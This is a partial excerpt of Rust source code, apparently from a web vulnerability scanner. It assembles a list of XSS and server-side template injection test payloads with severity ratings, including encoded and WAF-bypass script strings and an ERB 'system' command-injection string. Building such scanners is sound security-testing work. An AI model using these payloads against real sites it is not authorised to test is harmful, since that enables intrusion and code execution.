...
pub fn get_payloads() -> Vec<Payload> {
    ...
    let encoded_xss = vec![
        ...
        (
            "%C0%AEscript%C0%AEalert(1)%C0%AE/script%C0%AE",
            "Overlong UTF-8",
            Severity::Medium,
        ),
    ];
    ...
    let waf_bypass = vec![
        ...
        (
            "<img/src=x/onerror=alert(1)>",
            "Slash separators img",
            Severity::High,
        ),
        (
            "<svg/onload=alert(1)//",
            "SVG trailing slashes",
            Severity::High,
        ),
        (
    ...
    let special_contexts = vec![
        ...
        (
            "<%= system('id') %>",
            "ERB command injection",
            Severity::Critical,
        ),
    ];

    for (payload, desc, severity) in basic_xss {
    ...
    for (payload, desc, severity) in event_handlers {
        payloads.push(Payload {
            payload_type: PayloadType::Xss,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["event-handler".to_string()],
        });
    }

    for (payload, desc, severity) in encoded_xss {
        payloads.push(Payload {
            payload_type: PayloadType::Xss,
            payload: payload.to_string(),
            description: desc.to_string(),
    ...
    for (payload, desc, severity) in polyglot {
        payloads.push(Payload {
            payload_type: PayloadType::Xss,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["polyglot".to_string()],
        });
    }

    for (payload, desc, severity) in special_contexts {
        payloads.push(Payload {
            payload_type: PayloadType::Xss,
            payload: payload.to_string(),
            description: desc.to_string(),
            severity,
            tags: vec!["special-context".to_string(), "ssti".to_string()],
        });
    }
